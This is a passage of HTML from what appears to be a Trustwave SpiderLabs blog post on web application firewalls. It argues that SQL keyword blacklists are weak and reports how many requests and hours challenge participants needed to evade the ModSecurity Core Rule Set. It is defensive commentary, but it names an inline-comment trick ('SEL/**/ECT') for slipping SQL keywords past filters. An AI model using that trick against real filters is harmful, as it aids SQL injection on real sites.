+<blockquote><p><em>3) <strong>Don't rely on &quot;blacklisting&quot; methods</strong></em></p><ul><li><em>&quot;Blacklists&quot; (e.g. list with common SQL keywords SELECT, UNION, INSERT,...) are easy to circumvent (e.g. with usage of inline comments like SEL/**/ECT) and will trigger false positives in the long run (to be honest, you can do it in the low traffic site, and <strong>putting keywords like: SELECT, FROM and WHERE will keep 95% of attackers away, but those 5% will eventually find a way)</strong></em></li><li><em>Experts at WAF/IDS/IPS do this already far better than you'll ever do</em></li></ul></blockquote>
+<p>Input validation mechanisms should also utilize positive security models which specify the type, format and length of all input values.  <a href="https://www.trustwave.com/web-application-firewall.php" target="_self">In addition to input validation, commercial WAFs have transactional learning capabilities to identify anomalies in both input and output</a>.  In future blog posts, we will outline some of our research we are conducting in this area.</p>
+<h4>Hacking Resistance (Time-to-Hack)</h4>
+<p>Many people wrongly assume that installing a Web Application Firewall will make their sites &quot;Hack Proof.&quot;  Sadly, this is not reality.  The real goal of using a web application firewall should be to gain visibility and to make your web applications <em><strong>more difficult to hack</strong></em> meaning that it should take attackers significantly more time to hack a vulnerable web site with a WAF in front in blocking mode vs. if the WAF was not present at all.  </p>
+<p><em><strong>The idea is to substantially increase the &quot;Time-to-Hack&quot; metric associated with compromising a site in order allow for operational security to identify the threat and take appropriate actions.</strong></em></p>
+<p>Think of a WAF as a tool to identify and block the initial probes and to alert incident response personnel.  It is up to the IR teams to match wits with an attacker and protect the application as necessary.</p>
+<p>With this in mind, we analyzed how long it took for each Level II winner to develop a working evasion for the CRS v2.2.0.  We are basing this off of the correlated IP address in the logs that was tied to the final evasion payloads submitted to the ModSecurity team.  We also saw that many Level II winners actually tested their payloads using the CRS Demo page so we had to correlate test payloads there as well.</p>
+<ul><li><strong>Avg. # of Requests to find an evasion: 433</strong></li><li><strong>Avg. Duration (Time to find an evasion): 72 hrs</strong></li><li><strong>Shortest # of Requests to find an evasion: 118</strong></li><li><strong>Shortest Duration (Time to find an evasion): 10 hrs</strong></li></ul>
+<p>This data shows that having active monitoring and response capabilities of ongoing web attacks is paramount as it may only a matter of <em><strong>hours</strong></em> before a determined attacker finds a way through your defenses.</p>
+<p>I realize that there are a multitude of variables and conditions involved where people can say that these numbers are off (either too high or too low) depending on your defenses and attacker skill level.  Keep in mind that this metric was obtained from the ModSecurity WAF using mainly a negative security model ruleset.  The point of presenting this data, however, is to have some form of metric available for active web application monitoring and defense discussions related to exploitation timelines.  </p>
+                                </div>
+                            </div>
+
+                        </div>
+                    </article>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section bg-brand-secondary angle-bottom angle-bottom-gray-lighter angle-top angle-top-gray-lightest">
+    <div class="angle-top-placeholder"></div>
+    <div class="angle-bottom-placeholder"></div>
+
+
+
+<div class="container">
+
+        <h2 class="text-center text-white">Recent SpiderLabs Blog Posts</h2>
+    <ul class="slick-filter nav nav-tabs">
+
+    </ul>
+    <div class="row card-list card-list-slick-resources slick-uninitialized" data-slick='{"autoplay":false}'>
+                    <div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs">
+            <div class="card">
+                        <div class="card-media">
+                            <a href="/en-us/resources/blogs/spiderlabs-blog/evasive-urls-in-spam/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="EvasiveURLsinSpam" data-ga-value="1">
+                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
+                            </a>
+                        </div>
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                        <p class="mbx">Sep 17, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/resources/blogs/spiderlabs-blog/evasive-urls-in-spam/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="EvasiveURLsinSpam" data-ga-value="1">Evasive URLs in Spam</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
+            </div>
+
+                    </div>
+                    <div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs">
+            <div class="card">
+                        <div class="card-media">
+                            <a href="/en-us/resources/blogs/spiderlabs-blog/hijacking-a-domain-controller-with-netlogon-rpc-aka-zerologon-cve-2020-1472/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="HijackingaDomainControllerwithNetlogonRPCakaZerologonCVE" data-ga-value="1">
+                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
+                            </a>
+                        </div>
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                        <p class="mbx">Sep 17, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/resources/blogs/spiderlabs-blog/hijacking-a-domain-controller-with-netlogon-rpc-aka-zerologon-cve-2020-1472/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="HijackingaDomainControllerwithNetlogonRPCakaZerologonCVE" data-ga-value="1">Hijacking a Domain Controller with Netlogon RPC (aka Zerologon: CVE-2020-1472)</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
+            </div>
+
+                    </div>
+                    <div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs">
+            <div class="card">
+                        <div class="card-media">
+                            <a href="/en-us/resources/blogs/spiderlabs-blog/modsecurity-regular-expressions-and-disputed-cve-2020-15598/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="ModSecurityRegularExpressionsandDisputedCVE" data-ga-value="1">
+                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
+                            </a>
+                        </div>
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                        <p class="mbx">Sep 14, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/resources/blogs/spiderlabs-blog/modsecurity-regular-expressions-and-disputed-cve-2020-15598/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="ModSecurityRegularExpressionsandDisputedCVE" data-ga-value="1">ModSecurity, Regular Expressions and Disputed CVE-2020-15598</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
+            </div>
+
+                    </div>
+
+    </div>
+</div>
+
+</section>
+
+    </main>
+
+
+<footer class="site-footer">
+    <section class="section bg-primary bg-gradient-horizontal section-padding-bottom-none angle-top angle-top-gray-lighter">
+        <div class="angle-top-placeholder"></div>
+        <div class="angle-bottom-placeholder"></div>
+
+
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-7 col-md-8 col-lg-9">
+                    <span class="site-footer-brand">
+                        <img src="/img/logo/logo-trustwave-white.svg" alt="Trustwave" class="footer-logo">
+                    </span>
+                </div>
+                <div class="col-xs-10 col-sm-5 col-md-4 col-lg-3 mbs">
+                    <ul class="social-icons">
+                        <li><a href="https://www.linkedin.com/company/trustwave" target="_blank"><img src="/img/icon/social/svg/light/linkedin.svg" alt="LinkedIn"></a></li>
+                        <li><a href="https://twitter.com/Trustwave" target="_blank"><img src="/img/icon/social/svg/light/twitter.svg" alt="Twitter"></a></li>
+                        <li><a href="https://www.facebook.com/Trustwave/" target="_blank"><img src="/img/icon/social/svg/light/facebook.svg" alt="Facebook"></a></li>
+                        <li><a href="https://www.youtube.com/channel/UC2CCqdrAxD9-Fv83NOdjhqA" target="_blank"><img src="/img/icon/social/svg/light/youtube.svg" alt="YouTube"></a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-8 mbm">
+                    <div class="row">
+                        <div class="col-sm-6">
+                            <div class="row">
+                                <div class="col-xs-6">
+                                    <h5 class="mbx">
+                                        <a href="/en-us/services/">Services</a>
+                                    </h5>
+                                    <ul class="list-unstyled">
+                                        <li><a href="/en-us/services/managed-security/">Managed Security</a></li>
+                                        <li><a href="/en-us/services/security-testing/">Security Testing</a></li>
+                                        <li><a href="/en-us/services/technology/">Technology</a></li>
+                                        <li><a href="/en-us/services/consulting/">Consulting</a></li>
+                                        <li><a href="/en-us/services/education/">Education</a></li>
+                                    </ul>
+                                </div>
+                                <div class="col-xs-6">
+                                    <h5 class="mbx">
+                                        <a href="/en-us/capabilities/">Capabilities</a>
+                                    </h5>
+                                    <ul class="list-unstyled">
+                                        <li><a href="/en-us/capabilities/by-topic/">By Topic</a></li>
+                                        <li><a href="/en-us/capabilities/by-industry/">By Industry</a></li>
+                                        <li><a href="/en-us/capabilities/by-mandate/">By Mandate</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-sm-6">
+                            <div class="row">
+                                <div class="col-xs-6">
+                                    <h5 class="mbx">
+                                        <a href="/en-us/resources/">Resources</a>
+                                    </h5>
+                                    <ul class="list-unstyled">
+                                        <li><a href="/en-us/resources/blogs/">Blogs &amp; Stories</a></li>
+                                        <li><a href="/en-us/resources/library/">Resource Library</a></li>
+                                        <li><a href="/en-us/resources/security-resources/">Security Resources</a></li>
+                                        <li><a href="/en-us/resources/upcoming/">Events &amp; Webinars</a></li>
+                                    </ul>
+                                </div>
+                                <div class="col-xs-6">
+                                    <h5 class="mbx">
+                                        <a href="/en-us/company/">Company</a>
+                                    </h5>
+                                    <ul class="list-unstyled">
+                                        <li><a href="/en-us/company/about-us/">About Trustwave</a></li>
+                                        <li><a href="https://jobs.jobvite.com/trustwave" target="_blank">Careers</a></li>
+                                        <li><a href="/en-us/company/newsroom/">Newsroom</a></li>
+                                        <li><a href="/en-us/company/contact/">Contact</a></li>
+                                        <li><a href="/en-us/company/support/">Support</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-sm-9 col-md-4">
+                    <h5 class="text-white mbx">Stay Informed</h5>
+                    <p class="text-white">
+                        Sign up to receive the latest security news
+                        and trends from Trustwave.
+                    </p>
+                    <form method="get" target="_blank" action="https://www2.trustwave.com/Subscription-Center-Subscribe.html">
+                        <div class="form-group">
+                            <div class="input-group">
+                                <input type="text" class="form-control" name="Email" placeholder="email@example.com" style="
+                                background-color: rgba(0, 0, 0, 0.15);
+                                /* -webkit-border-radius: 50%; */
+                                border-radius: 25px;
+                                border: 0 none;
+                                border-top-right-radius: 0;
+                                border-bottom-right-radius: 0;
+">
+                                <span class="input-group-btn">
+                                    <button class="btn btn-default" type="submit" style="border-top-right-radius: 25px;border-bottom-right-radius: 25px;">
+                                        Subscribe
+                                    </button>
+                                </span>
+                            </div><!-- /input-group -->
+                            <p class="text-white text-sm mts">No spam, unsubscribe at any time.</p>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div class="site-footer-base">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-9">
+                        <ul class="site-footer-legal">
+                            <li><a href="/en-us/legal-documents/">Legal</a></li>
+                            <li><a href="/en-us/legal-documents/terms-of-use/">Terms of Use</a></li>
+                            <li><a href="/en-us/legal-documents/privacy-policy/">Privacy Policy</a></li>
+                        </ul>
+
+
+<div class="site-footer-language">
+    <div class="site-language-select">
+        <select id="LangSelector">
+            <option data-loc="/en-us/" data-lang="en-us" value="en-us">English</option>
+            <option data-loc="/de-de/" data-lang="de-de" value="de-de">German (Deutsche)</option>
+            <option data-loc="/ja-jp/" data-lang="ja=jp" value="ja-jp">Japanese (日本語)</option>
+        </select>
+    </div>
+</div>
+
+                        <div class="site-footer-copyright">
+                            Copyright &copy;
+                            <script>document.write(new Date().getFullYear())</script> Trustwave Holdings, Inc. <br class="visible-xs">All rights reserved.
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+</footer>
+
+<!-- Trustwave Modal and Loading Divs -->
+<div class="loading" style="display: none;">Loading</div>
+
+<div class="modal" id="modal"></div>
+
+<div class="modal mktomodal card card-lightbox mfp-hide">
+    
+    <div class="card-body">
+
+
+        <div class="botchallenge" style="display: none;">
+            <h2 class="text-center">Help Us Stop the Robot Uprising</h2>
+
+            <p class="text-center text-xl mbx">This is a bot-free zone. Please check the box to let us know you&#39;re human.</p>
+
+            <div class="captcha-box">
+
+            </div>
+        </div>
+
+
+
+        <div class="successdoc" style="display: none;">
+            <h2 class="text-center">Thank You</h2>
+
+            <p class="text-center">
+                <a target="_blank" href="#" class="dllinkdoc btn btn-primary mtl" rel="nofollow">Download Now</a>
+            </p>
+            <hr class="hr-bar">
+
+            <p class="text-center text-lg">Read complimentary reports and insightful stories in the <br><a href="/en-us/resources/">Trustwave Resource Center</a></p>
+        </div>
+
+
+
+        <div class="success" style="display: none;">
+            <h2 class="text-center">Thank You</h2>
+
+            <p class="text-center text-xl mbx">One of our sales specialists will be in touch shortly.</p>
+
+            <hr class="hr-bar">
+
+            <p class="text-center text-lg">Read complimentary reports and insightful stories in the <br><a href="/en-us/resources/">Trustwave Resource Center</a></p>
+        </div>
+        <form></form>
+    </div>
+    
+</div>
+
+<!-- Javascripts -->
+    <script src="https://player.vimeo.com/api/player.js"></script>
+        <script src="/dist/js/scripts.min.js?v=v34sa"></script>
+        <script src="//www.atmrum.net/rum.js"></script>
+        <script>rum.start("602cc9bb0a513db2b327299487211347");</script>
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5286e9523a723348"></script>
+    <script type="text/javascript" async="" src="//munchkin.marketo.net/154/munchkin.js"></script>
+    <script type="application/ld+json">
+        {
+        "@context": "http://schema.org",
+        "@type": "WebSite",
+        "url": "https://www.trustwave.com/",
+        "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://www.trustwave.com/en-us/search/?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+        }
+        }
+
+        {
+        "@context": "http://schema.org",
+        "@type": "Organization",
+        "url": "https://www.trustwave.com/",
+        "logo": "https://www.trustwave.com/img/logo/TW-logo-color.png"
+        }
+    </script>
+
+            <script src="https://cookie-cdn.cookiepro.com/langswitch/5142c8f1-532c-427b-a545-0bcfe1f6f4ea.js" type="text/javascript" charset="UTF-8"></script>
+            <script type="text/javascript">
+                function OptanonWrapper() { }
+            </script>
+
+</body>
+</html>
